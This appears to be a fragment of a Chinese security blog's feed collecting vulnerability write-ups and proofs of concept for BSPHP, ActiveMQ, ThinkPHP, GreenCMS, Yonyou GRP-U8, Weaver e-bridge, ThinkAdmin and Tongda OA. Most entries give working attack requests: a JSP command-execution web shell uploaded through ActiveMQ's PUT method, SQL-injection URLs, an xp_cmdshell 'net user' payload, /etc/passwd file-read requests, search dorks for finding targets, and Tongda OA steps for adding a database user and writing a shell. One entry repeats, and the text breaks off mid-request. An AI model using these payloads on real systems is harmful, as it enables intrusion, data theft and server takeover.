        <content type="html"><![CDATA[<h1 id="BSPHP存在未授权访问"><a href="#BSPHP存在未授权访问" class="headerlink" title="BSPHP存在未授权访问"></a>BSPHP存在未授权访问</h1><p>该处泄漏的⽤户名和用户登陆 IP</p><p>URL格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/admin/index.php?m=admin&amp;c=log&amp;a=table_json&amp;json=get&amp;soso_ok=1&amp;t=user_login_log&amp;page=1&amp;limit=10&amp;</span><br></pre></td></tr></table></figure><p>直接进行访问即可获得如下数据</p><p><img src="./BSPHP存在未授权访问/wp_editor_md_90752b3880f4de0612a22c38542748d8.jpg" alt></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/ActiveMQ/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/ActiveMQ/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h4 id="ActiveMQ任意文件上传漏洞"><a href="#ActiveMQ任意文件上传漏洞" class="headerlink" title="ActiveMQ任意文件上传漏洞"></a>ActiveMQ任意文件上传漏洞</h4><p>该漏洞出现在fileserver应用中，ActiveMQ中的fileserver服务允许用户通过HTTP  PUT方法上传文件到指定目录。Fileserver支持写入文件(不解析jsp),但是支持移动文件(Move)我们可以将jsp的文件PUT到Fileserver下,然后再通过Move指令移动到可执行目录下访问</p><p>使用vulhub一键搭建，靶机kali：192.168.1771.37</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>环境搭建成功，浏览器访问：<a href="http://IP:8161" target="_blank" rel="noopener">http://IP:8161</a></p><p><img src="ActiveMQ任意文件上传漏洞/1.png" alt="1"></p><p><img src="ActiveMQ任意文件上传漏洞/2.png" alt="2"></p><p>登录admin账号：默认账号admin/admin，抓包进行修改，使用PUT方法上传文件。ActiveMQ  Web控制台分为三个应用程序：其中admin，api和fileserver，其中admin是管理员页面，api是界面，fileserver是用于存储文件的界面；admin和api需要先登录才能使用，fileserver不需要登录。</p><p> 上传jsp文件（系统不稳定，有时成功有时失败），</p><p><img src="ActiveMQ任意文件上传漏洞/3.png" alt="3"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">PUT /fileserver/2.jsp HTTP/1.1</span><br><span class="line">Host: 192.168.177.137:8161</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Cookie: JSESSIONID=18wws8yzr1a04iz9gfpkkar3p</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4=</span><br><span class="line">X-Forwarded-For: 8.8.8.8</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 329</span><br><span class="line"></span><br><span class="line">&lt;%@ page import=&quot;java.io.*&quot;%&gt;</span><br><span class="line">&lt;%</span><br><span class="line"> out.print(&quot;Hello&lt;/br&gt;&quot;);</span><br><span class="line"> String strcmd=request.getParameter(&quot;cmd&quot;);</span><br><span class="line"> String line=null;</span><br><span class="line"> Process p=Runtime.getRuntime().exec(strcmd);</span><br><span class="line"> BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));</span><br><span class="line"> while((line=br.readLine())!=null)&#123;</span><br><span class="line"> out.print(line+&quot;&lt;/br&gt;&quot;);</span><br><span class="line"> &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></p><p> 使用MOVE方法移动文件，成功的包没截上，再次上传是500回显，文件已经上传成功，访问地址，成功解析jsp</p><p><img src="ActiveMQ任意文件上传漏洞/4.png" alt="4"></p><p> 使用MOVE方法移动文件，成功的包没截上，再次上传是500回显，文件已经上传成功，访问地址，成功解析jsp</p><p><img src="ActiveMQ任意文件上传漏洞/5.png" alt="5"></p><p><img src="ActiveMQ任意文件上传漏洞/6.png" alt="6"></p><p>漏洞影响版本：Apache ActiveMQ 5.x ~ 5.14.0</p><p>1、ActiveMQ Fileserver 的功能在 5.14.0 及其以后的版本中已被移除。建议用户升级至 5.14.0 及其以后版本。</p><p>2、通过移除 <code>conf\jetty.xml</code> 的以下配置来禁用 ActiveMQ Fileserver 功能</p><p><img src="ActiveMQ任意文件上传漏洞/7.png" alt="7"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>BSPHP存在未授权访问</title>
      <link href="/2021/07/16/BSPHP%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
      <url>/2021/07/16/BSPHP%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="BSPHP存在未授权访问"><a href="#BSPHP存在未授权访问" class="headerlink" title="BSPHP存在未授权访问"></a>BSPHP存在未授权访问</h1><p>该处泄漏的⽤户名和用户登陆 IP</p><p>URL格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/admin/index.php?m=admin&amp;c=log&amp;a=table_json&amp;json=get&amp;soso_ok=1&amp;t=user_login_log&amp;page=1&amp;limit=10&amp;</span><br></pre></td></tr></table></figure><p>直接进行访问即可获得如下数据</p><p><img src="./BSPHP存在未授权访问/wp_editor_md_90752b3880f4de0612a22c38542748d8.jpg" alt></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞库 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Thinkphp 5.0.(7-22)&amp;5.1.(0-30)远程代码执行漏洞</title>
      <link href="/2020/10/10/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.0.(7-22)&amp;5.1.(0-30)%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/10/10/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.0.(7-22)&amp;5.1.(0-30)%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>5.0.7&lt;=ThinkPHP5&lt;=5.0.22 5.1.0&lt;=ThinkPHP&lt;=5.1.30</p><h3 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h3><p><a href="https://www.bylibrary.cn/wp-content/uploads/2020/10/POC.txt" target="_blank" rel="noopener">POC</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 白阁-漏洞库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Thinkphp 5.0.(0-21)&amp;5.1.(3-25)sql注入漏洞</title>
      <link href="/2020/10/07/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.0.(0-21)&amp;5.1.(3-25)sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/10/07/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.0.(0-21)&amp;5.1.(3-25)sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>5.0.0 &lt;= ThinkPHP &lt;= 5.0.21 5.1.3 &lt;= ThinkPHP &lt;= 5.1.25</p><h3 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h3><p>5.0.0~5.0.21 、 5.1.3～5.1.10</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://********/index/index/index?options=id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23 **</span><br></pre></td></tr></table></figure><p>5.1.11～5.1.25</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://********/index/index/index?options=id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 白阁-漏洞库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Thinkphp 5.1.(16-22) sql注入漏洞</title>
      <link href="/2020/10/07/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.1.(16-22)%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/10/07/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.1.(16-22)%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>5.1.16 &lt;= ThinkPHP &lt;= 5.1.22</p><h3 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://********/index/index/index?orderby[id`|updatexml(1,concat(0x7,user(),0x7e),1)%23]=1</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 白阁-漏洞库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Thinkphp 5.1.(6-8) sql注入漏洞</title>
      <link href="/2020/10/04/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.1.(6-8)%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/10/04/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.1.(6-8)%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>5.1.6&lt;=ThinkPHP&lt;=5.1.7 非最新版5.1.8</p><h3 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h3><p>没开启debug看不到报错信息<code>`</code><br>http://<strong><em>**</em></strong>/index/index/index?username[0]=point&amp;username[1]=1&amp;username[2]=updatexml(1,concat(0x7,user(),0x7e),1)^&amp;username[3]=0 </p>]]></content>
      
      
      
        <tags>
            
            <tag> 白阁-漏洞库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Thinkphp 5.0.(13-15)&amp;5.1.(0-5) sql注入漏洞</title>
      <link href="/2020/10/04/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.0.(13-15)&amp;5.1.(0-5)%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/10/04/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.0.(13-15)&amp;5.1.(0-5)%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>5.0.13&lt;=ThinkPHP&lt;=5.0.15 5.1.0&lt;=ThinkPHP&lt;=5.1.5</p><h3 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h3><p>没开启debug看不到报错信息<code>`</code><br>http://<strong><strong>*</strong></strong>/index/index/index?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1 </p>]]></content>
      
      
      
        <tags>
            
            <tag> 白阁-漏洞库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Thinkphp 5.0.10 sql注入漏洞</title>
      <link href="/2020/10/03/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.0.10%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/10/03/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.0.10%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>ThinkPHP=5.0.10</p><h3 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h3><p><a href="https://www.bylibrary.cn/wp-content/uploads/2020/10/wp_editor_md_16afd3c5fbd670e82af455a8fd906b6c.jpg" target="_blank" rel="noopener"><img src="Thinkphp%205.0.10%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/wp_editor_md_16afd3c5fbd670e82af455a8fd906b6c.jpg" alt></a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 白阁-漏洞库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Thinkphp5文件包含漏洞</title>
      <link href="/2020/10/03/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp5.X%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/10/03/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp5.X%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>5.0.0 &lt;= Thinkphp &lt;= 5.0.18 5.1.0 &lt;= ThinkPHP &lt;= 5.1.10</p><h3 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://**********/index/index/index?cacheFile=1.jpg</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 白阁-武器库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GreenCMS 跨站请求伪造漏洞</title>
      <link href="/2020/09/26/01-CMS%E6%BC%8F%E6%B4%9E/GreenCMS/GreenCMS%20%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/09/26/01-CMS%E6%BC%8F%E6%B4%9E/GreenCMS/GreenCMS%20%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>GreenCMS v2.3.0603及以下版本</p><h3 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h3><p><a href="./GreenCMS 跨站请求伪造漏洞/POC.txt">POC</a> <a href="./GreenCMS 跨站请求伪造漏洞/wp_editor_md_bc96ed3f8e49d239fff0ab7b276f572a.jpg"><img src="./GreenCMS 跨站请求伪造漏洞/wp_editor_md_bc96ed3f8e49d239fff0ab7b276f572a.jpg" alt></a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 白阁-漏洞库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用友GRP-U8行政事业内控管理软件SQL注入漏洞</title>
      <link href="/2020/09/21/01-CMS%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8BGRP-U8%E8%A1%8C%E6%94%BF%E4%BA%8B%E4%B8%9A%E5%86%85%E6%8E%A7%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/09/21/01-CMS%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8BGRP-U8%E8%A1%8C%E6%94%BF%E4%BA%8B%E4%B8%9A%E5%86%85%E6%8E%A7%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h4 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息:"></a>漏洞信息:</h4><p>用友公司成立于1988年，全面提供具有自主知识产权的企业管理/ERP软件、服务与解决方案，是中国最大的管理软件、ERP软件、集团管理软件、人力资源管理软件、客户关系管理软件及小型企业管理软件提供商。其GRP-U8行政事业内控管理软件特定版本存在SQL注入漏洞，可用于命令执行执行。</p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现:"></a>漏洞复现:</h4><p>fofa_dork: “用友GRP-u8”</p><h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><p><code>`</code><br>POST /Proxy HTTP/1.1<br>Accept: Accept: <em>/</em><br>Content-Type: application/x-www-form-urlencoded<br>User-Agent: Mozilla/4.0 (compatible; MSIE 6.0;)<br>Host: host<br>Content-Length: 357<br>Connection: Keep-Alive<br>Cache-Control: no-cache</p><p>cVer=9.8.0&amp;dp=&lt;?xml version=”1.0” encoding=”GB2312”?&gt;<r9packet version="1"><dataformat>XML</dataformat><r9function><name>AS_DataRequest</name><params><param><name>ProviderName</name><data format="text">DataSetProviderData</data><param><name>Data</name><data format="text">exec xp_cmdshell ‘net user’</data></params></r9function></r9packet><br><code>`</code>输出md5值，用于poc验证： <img src="https://www.bylibrary.cn/wp-content/uploads/2020/09/微信图片_20200921092131.jpg" alt> 使用MSSQL xp_cmdshell执行命令 <img src="https://www.bylibrary.cn/wp-content/uploads/2020/09/微信图片_20200921092204.jpg" alt></p><h4 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案:"></a>修复方案:</h4><p>联系用友官方获得安全升级方案</p>]]></content>
      
      
      
        <tags>
            
            <tag> 白阁-漏洞库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>泛微云桥e-bridge 目录遍历/文件读取漏洞</title>
      <link href="/2020/09/21/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5e-bridge%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/09/21/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5e-bridge%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h4 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息:"></a>漏洞信息:</h4><p>泛微云桥是一个为了满足用户提出的阿里钉钉与泛微OA集成需泛微0A云桥e-bridge 其 /wxjsapi/saveYZJFile 接口可以读取文件内容并保存，而后可通过/file/fileNoLogin/{id}，读取文件内容。</p><h4 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围:"></a>影响范围:</h4><p>主要影响 2018-2019 版本</p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现:"></a>漏洞复现:</h4><p>如果使用POC回显<strong><code>&quot;无法验证您的身份！&quot;</code></strong>证明改漏洞已被修复<br> <strong>POC中，当downloadUrl的路径为文件夹的时候结果为目录遍历  linux windows 通用</strong><br> Windows POC：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///C:/&amp;fileExt=txt #查看页面中的id值</span><br></pre></td></tr></table></figure><p><img src="泛微云桥e-bridge 目录遍历文件读取漏洞/1913098-20201121233209437-1297218164.png" alt="img"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/file/fileNoLogin/&lt;id&gt; #访问文件接口，根据上一步获取的id对文件内容进行读取</span><br></pre></td></tr></table></figure><p><img src="泛微云桥e-bridge 目录遍历文件读取漏洞/1913098-20201121233253572-1802764402.png" alt="img"></p><p>如果提示<code>msg &quot;/C: (No such file or directory)&quot;</code>就表示为Linux系统（表示不存在C盘）<br> Linux POC：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///etc/passwd&amp;fileExt=txt</span><br><span class="line">/file/fileNoLogin/<span class="tag">&lt;<span class="name">id</span>&gt;</span> #访问文件接口，根据上一步获取的id对文件内容进行读取</span><br></pre></td></tr></table></figure><h3 id="04-实例"><a href="#04-实例" class="headerlink" title="04 实例"></a>04 实例</h3><p>Linux系统主目录（根目录）<br> <img src="泛微云桥e-bridge 目录遍历文件读取漏洞/1913098-20201121234212131-625392001.png" alt="img"><br> Linux中/ect/passwd文件<br> <img src="泛微云桥e-bridge 目录遍历文件读取漏洞/1913098-20201121234407372-1517558070.png" alt="img"></p><h4 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案:"></a>修复方案:</h4><p>尽快升级到最新版本</p>]]></content>
      
      
      
        <tags>
            
            <tag> 白阁-漏洞库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Thinkadmin v6任意文件读取漏洞（CVE-2020-25540）</title>
      <link href="/2020/09/21/01-CMS%E6%BC%8F%E6%B4%9E/Thinkadmin/Thinkadmin%20v6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-25540%EF%BC%89/"/>
      <url>/2020/09/21/01-CMS%E6%BC%8F%E6%B4%9E/Thinkadmin/Thinkadmin%20v6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-25540%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h4 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息:"></a>漏洞信息:</h4><p>ThinkAdmin是一套基于ThinkPHP框架的通用后台管理系统。ThinkAdmin 6版本存在路径遍历漏洞。攻击者可利用该漏洞通过GET请求编码参数任意读取远程服务器上的文件。</p><h4 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围:"></a>影响范围:</h4><p>Thinkadmin版本小于 ≤ 2020.08.03.01</p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现:"></a>漏洞复现:</h4><p>fofa_dork: “ThinkAdmin” &amp;&amp; title”系统登录 · ThinkAdmin”</p><h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /admin.html?s=admin/api.Update/node HTTP/1.1</span><br><span class="line">Host: xxxxxx</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 22</span><br><span class="line"></span><br><span class="line">rules=%5B%22.%2F%22%5D </span><br><span class="line">```![](https://www.bylibrary.cn/wp-content/uploads/2020/09/微信图片_20200921085600.jpg) 获取版本信息:</span><br></pre></td></tr></table></figure><p><a href="https://xxxxx/admin.html?s=admin/api.Update/version" target="_blank" rel="noopener">https://xxxxx/admin.html?s=admin/api.Update/version</a><br><code>`</code>2、⽂件读取,后⾯那⼀串是UTF8字符串加密后的结果。计算⽅式在Update.php中的加密函数。 /admin.html? s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b2r33322u2x2v1b2s2p382p2q2p372t0y342w34 <a href="https://www.bylibrary.cn/wp-content/uploads/2020/09/wp_editor_md_502ae6ea9426ef92a5791175b16de552.jpg" target="_blank" rel="noopener"><img src="https://www.bylibrary.cn/wp-content/uploads/2020/09/wp_editor_md_502ae6ea9426ef92a5791175b16de552.jpg" alt></a></p><h4 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案:"></a>修复方案:</h4><p>目前厂商已经发布修复相关问题，请受影响用户尽快升级到安全版本</p>]]></content>
      
      
      
        <tags>
            
            <tag> 白阁-漏洞库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通达OA 11.7存在sql注入</title>
      <link href="/2020/09/19/01-CMS%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BEOA%2011.7%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/09/19/01-CMS%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BEOA%2011.7%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h4 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h4><p>通达oa 11.7 利用条件:需要账号登录</p><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><p>1、下载通达OA 11.7，<a href="https://cdndown.tongda2000.com/oa/2019/TDOA11.7.exe" target="_blank" rel="noopener">https://cdndown.tongda2000.com/oa/2019/TDOA11.7.exe</a> </p><p>2、condition_cascade参数存在布尔盲注  </p><p>3.经过测试，过滤了一些函数(sleep、报错的函数等等)，各种注释，使用payload：select if((1=1),1,power(9999,99))、select if((1=2),1,power(9999,99))，判断注入点 #当字符相等时，不报错，错误时报错 </p><p>4、通过添加用户at666，密码为abcABC@123  </p><p>5、使用Navicat Premium连接数据库 </p><p>6、添加的账户不能直接通过日志慢查询写入文件，需要给创建的账户添加权限 <a href="https://www.bylibrary.cn/wp-content/uploads/2020/09/提权.txt" target="_blank" rel="noopener">提权</a> </p><p>7、然后用注入点刷新权限，因为该用户是没有刷新权限的权限的<br>general/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges; </p><p>8、再次登录，提示密码过期，需要重新执行grant all privileges ON mysql.* TO ‘at666‘@’%’ IDENTIFIED BY ‘abcABC@123’ WITH GRANT OPTION </p><p>9、然后写shell </p><p>10、菜刀连接</p><p>=========================================================================</p><p><strong>通达OA 11.7 后台sql注入漏洞复现</strong></p><p><strong>一、**</strong>漏洞描述**</p><p> 通达OA 11.7存在sql注入</p><p><strong>二、漏洞影响版本</strong></p><p> 通达oa 11.7</p><p>利用条件:需要账号登录 </p><p><strong>三、漏洞复现</strong></p><p>1、下载通达OA 11.7，<a href="https://cdndown.tongda2000.com/oa/2019/TDOA11.7.exe，点击安装" target="_blank" rel="noopener">https://cdndown.tongda2000.com/oa/2019/TDOA11.7.exe，点击安装</a></p><p>2、condition_cascade参数存在布尔盲注</p><p>POC：</p><p><a href="javascript:void(0" target="_blank" rel="noopener"><img src="通达OA 11.7存在sql注入/copycode.gif" alt="复制代码"></a>;)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /general/hr/manage/query/delete_cascade.php?condition_cascade=select if((substr(user(),1,1)=&apos;r&apos;),1,power(9999,99)) HTTP/1.1</span><br><span class="line">Host: 